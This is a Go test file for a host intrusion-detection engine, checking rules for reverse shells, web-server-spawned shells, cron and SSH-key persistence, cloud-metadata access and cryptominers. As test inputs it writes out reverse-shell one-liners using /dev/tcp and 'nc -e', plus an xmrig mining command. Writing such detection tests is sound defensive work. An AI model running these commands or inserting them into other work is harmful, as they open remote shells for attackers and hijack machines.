package detect

import (
	"testing"

	"sentinelmesh/detection-engine/internal/types"
)

func TestShellFromWebProcessRule(t *testing.T) {
	r := ShellFromWebProcessRule{}

	malicious := types.Event{
		Process:    &types.ProcessInfo{Exe: "/bin/bash"},
		RawPayload: map[string]interface{}{"proc.pname": "nginx"},
	}
	if score, matched := r.Evaluate(malicious); !matched || score < 0.5 {
		t.Errorf("expected match on shell spawned from nginx, got score=%v matched=%v", score, matched)
	}

	benign := types.Event{
		Process:    &types.ProcessInfo{Exe: "/bin/bash"},
		RawPayload: map[string]interface{}{"proc.pname": "systemd"},
	}
	if _, matched := r.Evaluate(benign); matched {
		t.Errorf("did not expect match on shell spawned from systemd")
	}
}

func TestReverseShellIndicatorRule(t *testing.T) {
	r := NewReverseShellIndicatorRule()

	cases := []struct {
		cmdline string
		want    bool
	}{
		{"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", true},
		{"ls -la /home/user", false},
		{"nc -e /bin/sh 10.0.0.1 4444", true},
	}
	for _, c := range cases {
		ev := types.Event{Process: &types.ProcessInfo{Cmdline: c.cmdline}}
		_, matched := r.Evaluate(ev)
		if matched != c.want {
			t.Errorf("cmdline=%q: expected matched=%v, got %v", c.cmdline, c.want, matched)
		}
	}
}

func TestPrivilegeEscalationRule(t *testing.T) {
	r := NewPrivilegeEscalationRule()

	ev := types.Event{
		Process:    &types.ProcessInfo{Exe: "/usr/bin/sudo"},
		RawPayload: map[string]interface{}{"proc.pname": "java"},
	}
	if _, matched := r.Evaluate(ev); !matched {
		t.Errorf("expected match: sudo spawned from java process")
	}

	interactive := types.Event{
		Process:    &types.ProcessInfo{Exe: "/usr/bin/sudo"},
		RawPayload: map[string]interface{}{"proc.pname": "bash"},
	}
	if _, matched := r.Evaluate(interactive); matched {
		t.Errorf("did not expect match: sudo from an interactive shell")
	}
}

func TestPersistenceCronRule(t *testing.T) {
	r := NewPersistenceCronRule()

	ev := types.Event{File: &types.FileInfo{Path: "/etc/cron.d/backdoor", Operation: "write"}}
	if _, matched := r.Evaluate(ev); !matched {
		t.Errorf("expected match: write to /etc/cron.d")
	}

	ev2 := types.Event{File: &types.FileInfo{Path: "/home/user/notes.txt", Operation: "write"}}
	if _, matched := r.Evaluate(ev2); matched {
		t.Errorf("did not expect match: unrelated file write")
	}
}

func TestSSHAuthorizedKeysRule(t *testing.T) {
	r := SSHAuthorizedKeysRule{}
	ev := types.Event{File: &types.FileInfo{Path: "/home/user/.ssh/authorized_keys", Operation: "write"}}
	if _, matched := r.Evaluate(ev); !matched {
		t.Errorf("expected match: write to authorized_keys")
	}
}

func TestCloudMetadataAccessRule(t *testing.T) {
	r := CloudMetadataAccessRule{}
	ev := types.Event{Network: &types.NetworkInfo{DstIP: "169.254.169.254"}}
	if _, matched := r.Evaluate(ev); !matched {
		t.Errorf("expected match: connection to cloud metadata IP")
	}
	benign := types.Event{Network: &types.NetworkInfo{DstIP: "8.8.8.8"}}
	if _, matched := r.Evaluate(benign); matched {
		t.Errorf("did not expect match: connection to unrelated IP")
	}
}

func TestCryptominerIndicatorRule(t *testing.T) {
	r := NewCryptominerIndicatorRule()

	byCmd := types.Event{Process: &types.ProcessInfo{Cmdline: "./xmrig -o stratum+tcp://pool:3333"}}
	if _, matched := r.Evaluate(byCmd); !matched {
		t.Errorf("expected match: xmrig command line")
	}

	byPort := types.Event{Network: &types.NetworkInfo{DstPort: 3333}}
	if _, matched := r.Evaluate(byPort); !matched {
		t.Errorf("expected match: stratum port")
	}
}

func TestEngineAggregatesIndependentRiskAndThresholds(t *testing.T) {
	engine := NewEngine(DefaultRules(), 0.9, 0.6, 0.95)

	ev := types.Event{
		EventType:  "process_exec",
		Process:    &types.ProcessInfo{Exe: "/bin/bash", Cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
		RawPayload: map[string]interface{}{"proc.pname": "nginx"},
	}
	v := engine.Evaluate(ev)
	if v.Action != types.ActionEscalateToReclaim {
		t.Errorf("expected reclaim action for multiple high-confidence matches, got %v (score=%v, rules=%v)",
			v.Action, v.Score, v.MatchedRules)
	}
	if len(v.MatchedRules) < 2 {
		t.Errorf("expected both shell_from_web_process and reverse_shell_indicator to fire, got %v", v.MatchedRules)
	}
	if v.Score < 0.95 {
		t.Errorf("expected combined risk to cross reclaim threshold, got %v", v.Score)
	}

	benignEv := types.Event{EventType: "process_exec", Process: &types.ProcessInfo{Exe: "/usr/bin/ls"}}
	v2 := engine.Evaluate(benignEv)
	if v2.Action != types.ActionNone {
		t.Errorf("expected no action for benign event, got %v", v2.Action)
	}
}

func TestEngineRoutesHighConfidenceNetworkToBlock(t *testing.T) {
	engine := NewEngine([]Rule{CloudMetadataAccessRule{}}, 0.7, 0.5, 0.98)
	ev := types.Event{EventType: "network_connect", Network: &types.NetworkInfo{SrcIP: "10.20.30.40", DstIP: "169.254.169.254"}}
	v := engine.Evaluate(ev)
	if v.Action != types.ActionBlockNetwork {
		t.Fatalf("expected block_network, got %s score=%.2f", v.Action, v.Score)
	}
}

func TestEngineRoutesHighConfidenceFileToQuarantine(t *testing.T) {
	engine := NewEngine([]Rule{SensitiveFileAccessRule{SensitivePrefixes: []string{"/etc/shadow"}}}, 0.7, 0.5, 0.98)
	ev := types.Event{EventType: "file_write", File: &types.FileInfo{Path: "/etc/shadow", Operation: "write"}}
	v := engine.Evaluate(ev)
	if v.Action != types.ActionQuarantineFile {
		t.Fatalf("expected quarantine_file, got %s score=%.2f", v.Action, v.Score)
	}
}
